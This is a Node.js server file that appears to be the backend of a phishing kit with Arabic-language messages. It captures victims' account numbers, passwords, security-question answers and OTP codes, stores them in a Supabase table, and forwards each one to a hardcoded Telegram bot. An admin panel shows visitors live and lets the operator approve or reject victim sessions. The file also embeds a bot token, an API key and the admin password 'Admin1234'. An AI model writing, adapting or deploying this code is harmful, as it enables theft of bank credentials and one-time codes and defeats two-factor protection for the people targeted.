const http = require("http");
const fs = require("fs");
const path = require("path");
const https = require("https");
const { createClient } = require("@supabase/supabase-js");

const PORT = process.env.PORT || 3000;
const SETTINGS_FILE = path.join(__dirname, "settings.json");
const ADMIN_PASSWORD = "Admin1234";

const SUPABASE_URL = process.env.SUPABASE_URL || "https://kwmjafdwvfewhftyatio.supabase.co";
const SUPABASE_KEY = process.env.SUPABASE_KEY || "sb_publishable_DsDXkP1UbTMGZvVT6V2X5Q_hbhjBEaM";
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

async function addSubmission(type, data, session_id) {
  const entry = {
    id: Date.now() + "_" + Math.random().toString(36).slice(2, 8),
    type,
    account: data.account || "",
    status: "pending",
    time: new Date().toISOString(),
    data: { ...data, _sid: session_id || "" }
  };
  const { error } = await supabase.from("submissions").insert(entry);
  if (error) console.error("[DB] insert error:", error.message);
  else console.log("[DB] saved submission:", type, entry.id);
  return entry;
}

async function getSubmissions() {
  const { data } = await supabase.from("submissions").select("*").order("time", { ascending: false }).limit(500);
  return data || [];
}

async function deleteSubmission(id) {
  await supabase.from("submissions").delete().eq("id", id);
}

async function clearSubmissions() {
  await supabase.from("submissions").delete().neq("id", "");
}

const adminSessions = new Set();

// Active visitors tracking
const visitors = new Map();
const VISITOR_TIMEOUT = 60000;

function getClientIp(req) {
  return req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || req.socket.remoteAddress || "unknown";
}

function trackVisitor(req) {
  const ip = getClientIp(req);
  const ua = req.headers["user-agent"] || "";
  const key = ip + "|" + ua.slice(0, 50);
  visitors.set(key, { ip, t: Date.now(), ua: ua.slice(0, 80) });
}

const clientSessions = new Map();
const SESSION_TIMEOUT = 30 * 60 * 1000;

function getOrCreateSession(ip, account) {
  const existing = clientSessions.get(ip);
  if (existing && (Date.now() - existing.created < SESSION_TIMEOUT)) {
    if (account) existing.account = account;
    return existing.session_id;
  }
  const session_id = "sess_" + Date.now() + "_" + Math.random().toString(36).slice(2, 8);
  clientSessions.set(ip, { session_id, account: account || "", created: Date.now() });
  return session_id;
}

function getActiveVisitors() {
  const now = Date.now();
  for (const [k, v] of visitors) {
    if (now - v.t > VISITOR_TIMEOUT) visitors.delete(k);
  }
  return [...visitors.values()];
}

const MIME = {
  ".html": "text/html; charset=utf-8",
  ".css": "text/css",
  ".js": "application/javascript",
  ".json": "application/json",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".gif": "image/gif",
  ".svg": "image/svg+xml",
  ".ico": "image/x-icon",
  ".woff": "font/woff",
  ".woff2": "font/woff2",
  ".ttf": "font/ttf",
  ".webp": "image/webp",
  ".mp4": "video/mp4",
};

function loadSettings() {
  try {
    if (fs.existsSync(SETTINGS_FILE)) {
      return JSON.parse(fs.readFileSync(SETTINGS_FILE, "utf-8"));
    }
  } catch (e) {}
  return { bot_token: process.env.BOT_TOKEN || "9000760468:AAFJt8dcBJxocepdfWq0Hpoo9zugqZs6m-E", chat_id: process.env.CHAT_ID || "8566318136", updated_at: null };
}

function saveSettings(s) {
  fs.writeFileSync(SETTINGS_FILE, JSON.stringify(s, null, 2));
}

function sendTelegram(botToken, chatId, text) {
  return new Promise((resolve, reject) => {
    if (!botToken || !chatId) { console.log("[TG] missing token/chatId"); return resolve(false); }
    console.log("[TG] sending to chat", chatId, "token:", botToken.slice(0,10) + "...");
    const payload = JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" });
    const req = https.request(
      {
        hostname: "api.telegram.org",
        path: `/bot${botToken}/sendMessage`,
        method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(payload) },
      },
      (res) => {
        let body = "";
        res.on("data", (c) => (body += c));
        res.on("end", () => {
          console.log("[TG] response:", res.statusCode, body.slice(0, 200));
          resolve(res.statusCode === 200);
        });
      }
    );
    req.on("error", (e) => { console.log("[TG] error:", e.message); resolve(false); });
    req.write(payload);
    req.end();
  });
}

function deserializeSeroval(node) {
  if (!node || typeof node !== "object") return node;
  switch (node.t) {
    case 0: return node.s;
    case 1: return node.s;
    case 2: return [null, undefined, true, false, -0, Infinity, -Infinity, NaN][node.s];
    case 9: return (node.a || []).map(deserializeSeroval);
    case 10: {
      const obj = {};
      if (node.p) {
        for (let i = 0; i < node.p.k.length; i++)
          obj[node.p.k[i]] = deserializeSeroval(node.p.v[i]);
      }
      return obj;
    }
    default: return node;
  }
}

function readBody(req) {
  return new Promise((resolve) => {
    let body = "";
    req.on("data", (c) => (body += c));
    req.on("end", () => {
      try {
        const parsed = JSON.parse(body);
        let tree = parsed;
        if (parsed && typeof parsed.t === "object" && parsed.t !== null && "f" in parsed) {
          tree = parsed.t;
        }
        if (tree && typeof tree.t === "number" && tree.p) {
          resolve(deserializeSeroval(tree));
        } else {
          resolve(parsed);
        }
      } catch { resolve({}); }
    });
  });
}

function sendJson(res, data) {
  const json = JSON.stringify({ result: data });
  res.writeHead(200, { "Content-Type": "application/json" });
  res.end(json);
}

async function detectAndSend(data, ip) {
  const session_id = ip ? getOrCreateSession(ip, data.account || "") : "";
  const s = loadSettings();
  const time = new Date().toLocaleString("ar-EG");
  if (data.password) {
    await addSubmission("login", data, session_id);
    const msg = `🔐 <b>تسجيل دخول جديد</b>\n\n👤 رقم الحساب: <code>${data.account || ""}</code>\n🔑 كلمة المرور: <code>${data.password || ""}</code>\n📋 الخدمة: ${data.service || "غير محدد"}\n⏰ ${time}`;
    return sendTelegram(s.bot_token, s.chat_id, msg);
  }
  if (data.question || data.answer) {
    await addSubmission("security", data, session_id);
    const msg = `🛡️ <b>سؤال أمان</b>\n\n❓ السؤال: ${data.question || ""}\n✏️ الجواب: <code>${data.answer || ""}</code>\n👤 الحساب: <code>${data.account || ""}</code>\n⏰ ${time}`;
    return sendTelegram(s.bot_token, s.chat_id, msg);
  }
  if (data.code || data.otp || data.otp_code) {
    await addSubmission("otp", data, session_id);
    const msg = `🔢 <b>رمز OTP</b>\n\n🔑 الرمز: <code>${data.code || data.otp || data.otp_code || ""}</code>\n👤 الحساب: <code>${data.account || ""}</code>\n⏰ ${time}`;
    return sendTelegram(s.bot_token, s.chat_id, msg);
  }
  return true;
}

function parseCookies(req) {
  const cookies = {};
  (req.headers.cookie || "").split(";").forEach(c => {
    const [k, v] = c.trim().split("=");
    if (k) cookies[k] = v;
  });
  return cookies;
}

function isAdminLoggedIn(req) {
  const cookies = parseCookies(req);
  return cookies.admin_session && adminSessions.has(cookies.admin_session);
}

function sendHtml(res, filePath) {
  fs.readFile(filePath, (err, data) => {
    if (err) { res.writeHead(500); res.end("Error"); return; }
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    res.end(data);
  });
}

function sendJsonApi(res, code, obj) {
  res.writeHead(code, { "Content-Type": "application/json", "Cache-Control": "no-store" });
  res.end(JSON.stringify(obj));
}

function readJsonBody(req) {
  return new Promise((resolve) => {
    let body = "";
    req.on("data", (c) => (body += c));
    req.on("end", () => { try { resolve(JSON.parse(body)); } catch { resolve({}); } });
  });
}

const SERVER_FN_HANDLERS = {
  "5a778137b307c3c64bcb13b4f224a252e8f3929d980316359d75b7e570ad9a78": async (data, ip) => {
    await detectAndSend(data, ip);
    return { ok: true };
  },
  "8f77dad699ccdcb965b75b5b4ade8d14cc361218add59796aa50c9bb1dc34fda": async (data, ip) => {
    await detectAndSend(data, ip);
    return { ok: true };
  },
  "f3104eed51e53b25722f81ffc68fdea6ff2734a01f7814fd27fd5ba59405d58a": async (data, ip) => {
    await detectAndSend(data, ip);
    return { ok: true };
  },
  "558c58ed06e8b7706d065b4277a2f70a11c7f1f3fdb164ce74a206e5697d440f": async (data, ip) => {
    await detectAndSend(data, ip);
    return { ok: true };
  },
  "01b7b7d8a082e3c609ee93861dd303887d75b7309ad540f543aeaf3b7462ab10": async (data, ip) => {
    await detectAndSend(data, ip);
    return { ok: true };
  },

  // Admin login
  "625e04301b2d3f14dea17625c57911242ac2f01b582f63aad6a4695a662c8012": async (data) => {
    if (data.password !== ADMIN_PASSWORD) {
      return { ok: false, error: "كلمة المرور غير صحيحة" };
    }
    const s = loadSettings();
    return { ok: true, bot_token: s.bot_token, chat_id: s.chat_id, updated_at: s.updated_at };
  },

  // Admin save settings
  "a48140e83a983a9af35c0fdf8ec5024c5dc9120f9ce2b325be6c3db95bdc9d19": async (data) => {
    if (data.password !== ADMIN_PASSWORD) {
      return { ok: false, error: "كلمة المرور غير صحيحة" };
    }
    const s = { bot_token: data.bot_token || "", chat_id: data.chat_id || "", updated_at: new Date().toISOString() };
    saveSettings(s);
    return { ok: true };
  },

  // Admin test bot
  "707f8c6114bd6aa53cb10e4e7ac37e3fe6f2784ea9ed6e73a66aac87192de0c4": async (data) => {
    if (data.password !== ADMIN_PASSWORD) {
      return { ok: false, error: "كلمة المرور غير صحيحة" };
    }
    const s = loadSettings();
    const sent = await sendTelegram(s.bot_token, s.chat_id, "✅ رسالة اختبار — البوت يعمل بنجاح!");
    return sent ? { ok: true } : { ok: false, error: "فشل إرسال الرسالة" };
  },
};

http.createServer(async (req, res) => {
  const urlPath = decodeURIComponent(req.url.split("?")[0]);

  if (!urlPath.startsWith("/admin")) {
    trackVisitor(req);
  }

  // Admin routes
  if (urlPath === "/admin-login" || urlPath === "/admin-login.html") {
    return sendHtml(res, path.join(__dirname, "admin-login.html"));
  }

  if (urlPath === "/admin-panel" || urlPath === "/admin-panel.html") {
    if (!isAdminLoggedIn(req)) {
      res.writeHead(302, { Location: "/admin-login" });
      return res.end();
    }
    return sendHtml(res, path.join(__dirname, "admin-panel.html"));
  }

  if (urlPath === "/admin/login" && req.method === "POST") {
    const body = await readJsonBody(req);
    if (body.password === ADMIN_PASSWORD) {
      const token = Date.now().toString(36) + Math.random().toString(36).slice(2);
      adminSessions.add(token);
      res.writeHead(200, {
        "Content-Type": "application/json",
        "Set-Cookie": `admin_session=${token}; HttpOnly; Path=/`
      });
      return res.end(JSON.stringify({ ok: true }));
    }
    return sendJsonApi(res, 401, { ok: false, error: "كلمة المرور غير صحيحة" });
  }

  if (urlPath === "/admin/logout") {
    const cookies = parseCookies(req);
    if (cookies.admin_session) adminSessions.delete(cookies.admin_session);
    res.writeHead(302, {
      Location: "/admin-login",
      "Set-Cookie": "admin_session=; HttpOnly; Path=/; Max-Age=0"
    });
    return res.end();
  }

  if (urlPath === "/admin/api/submissions" && req.method === "GET") {
    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
    const submissions = await getSubmissions();
    return sendJsonApi(res, 200, { ok: true, submissions });
  }

  if (urlPath === "/admin/api/delete" && req.method === "POST") {
    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
    const body = await readJsonBody(req);
    if (body.id) await deleteSubmission(body.id);
    return sendJsonApi(res, 200, { ok: true });
  }

  if (urlPath === "/admin/api/clear" && req.method === "POST") {
    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
    await clearSubmissions();
    return sendJsonApi(res, 200, { ok: true });
  }

  if (urlPath === "/admin/api/settings" && req.method === "GET") {
    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
    const s = loadSettings();
    return sendJsonApi(res, 200, { ok: true, bot_token: s.bot_token, chat_id: s.chat_id });
  }

  if (urlPath === "/admin/api/settings" && req.method === "POST") {
    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
    const body = await readJsonBody(req);
    const s = { bot_token: body.bot_token || "", chat_id: body.chat_id || "", updated_at: new Date().toISOString() };
    saveSettings(s);
    return sendJsonApi(res, 200, { ok: true });
  }

  if (urlPath === "/admin/api/test-bot" && req.method === "POST") {
    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
    const s = loadSettings();
    const sent = await sendTelegram(s.bot_token, s.chat_id, "✅ رسالة اختبار — البوت يعمل بنجاح!");
    return sendJsonApi(res, 200, sent ? { ok: true } : { ok: false, error: "فشل الإرسال" });
  }

  if (urlPath === "/admin/api/active-visits" && req.method === "GET") {
    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
    const active = getActiveVisitors();
    return sendJsonApi(res, 200, { ok: true, count: active.length, visitors: active });
  }

  if (urlPath === "/admin/api/approve" && req.method === "POST") {
    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
    const body = await readJsonBody(req);
    if (body.id) {
      await supabase.from("submissions").update({ status: "approved" }).eq("id", body.id);
    }
    return sendJsonApi(res, 200, { ok: true });
  }

  if (urlPath === "/admin/api/reject" && req.method === "POST") {
    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
    const body = await readJsonBody(req);
    if (body.id) {
      await supabase.from("submissions").update({ status: "rejected" }).eq("id", body.id);
    }
    return sendJsonApi(res, 200, { ok: true });
  }

  if (urlPath === "/admin/api/sessions" && req.method === "GET") {
    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
    const submissions = await getSubmissions();
    const sessionsMap = {};
    submissions.forEach(s => {
      const d = s.data || {};
      const sid = d._sid || ("acct_" + (s.account || s.id));
      if (!sessionsMap[sid]) {
        sessionsMap[sid] = { session_id: sid, account: s.account || "", status: "pending", time: s.time, steps: [] };
      }
      sessionsMap[sid].steps.push(s);
      if (s.account) sessionsMap[sid].account = s.account;
    });
    Object.values(sessionsMap).forEach(sess => {
      if (sess.steps.some(s => s.status === "rejected")) sess.status = "rejected";
      else if (sess.steps.every(s => s.status === "approved")) sess.status = "approved";
      else sess.status = "pending";
    });
    const sessions = Object.values(sessionsMap).sort((a, b) => new Date(b.time) - new Date(a.time));
    return sendJsonApi(res, 200, { ok: true, sessions });
  }

  if (urlPath === "/admin/api/approve-session" && req.method === "POST") {
    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
    const body = await readJsonBody(req);
    if (body.session_id) {
      if (body.session_id.startsWith("acct_")) {
        const account = body.session_id.replace("acct_", "");
        await supabase.from("submissions").update({ status: "approved" }).eq("account", account);
      } else {
        await supabase.from("submissions").update({ status: "approved" }).contains("data", { _sid: body.session_id });
      }
    }
    return sendJsonApi(res, 200, { ok: true });
  }

  if (urlPath === "/admin/api/reject-session" && req.method === "POST") {
    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
    const body = await readJsonBody(req);
    if (body.session_id) {
      if (body.session_id.startsWith("acct_")) {
        const account = body.session_id.replace("acct_", "");
        await supabase.from("submissions").update({ status: "rejected" }).eq("account", account);
      } else {
        await supabase.from("submissions").update({ status: "rejected" }).contains("data", { _sid: body.session_id });
      }
    }
    return sendJsonApi(res, 200, { ok: true });
  }

  if (urlPath === "/admin/api/delete-session" && req.method === "POST") {
    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
    const body = await readJsonBody(req);
    if (body.session_id) {
      if (body.session_id.startsWith("acct_")) {
        const account = body.session_id.replace("acct_", "");
        await supabase.from("submissions").delete().eq("account", account);
      } else {
        await supabase.from("submissions").delete().contains("data", { _sid: body.session_id });
      }
    }
    return sendJsonApi(res, 200, { ok: true });
  }

  if (urlPath.startsWith("/_serverFn/") && req.method === "POST") {
    const hash = urlPath.replace("/_serverFn/", "");
    console.log("[REQ] serverFn hash:", hash.slice(0, 12) + "...", "from:", req.headers["user-agent"]?.slice(0, 40));
    const handler = SERVER_FN_HANDLERS[hash];
    if (!handler) {
      console.log("[REQ] NO HANDLER for hash:", hash);
      try {
        const body = await readBody(req);
        const input = body.data || body;
        console.log("[REQ] unknown hash data keys:", Object.keys(input));
        await detectAndSend(input, getClientIp(req));
      } catch (e) {}
      sendJson(res, { ok: true });
      return;
    }
    try {
      const body = await readBody(req);
      const input = body.data || body;
      console.log("[REQ] parsed input keys:", Object.keys(input));
      const result = await handler(input, getClientIp(req));
      console.log("[REQ] result:", JSON.stringify(result).slice(0, 200));
      sendJson(res, result);
    } catch (e) {
      console.error("[REQ] Server fn error:", e);
      sendJson(res, { ok: false, error: "خطأ في الخادم" });
    }
    return;
  }

  let filePath = "." + urlPath;
  if (filePath === "./") filePath = "./index.html";

  const ext = path.extname(filePath).toLowerCase();

  if (ext && fs.existsSync(filePath)) {
    const contentType = MIME[ext] || "application/octet-stream";
    fs.readFile(filePath, (err, data) => {
      if (err) { res.writeHead(500); res.end("Error"); return; }
      res.writeHead(200, { "Content-Type": contentType });
      res.end(data);
    });
  } else {
    fs.readFile("./index.html", (err, data) => {
      if (err) { res.writeHead(500); res.end("Error"); return; }
      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      res.end(data);
    });
  }
}).listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
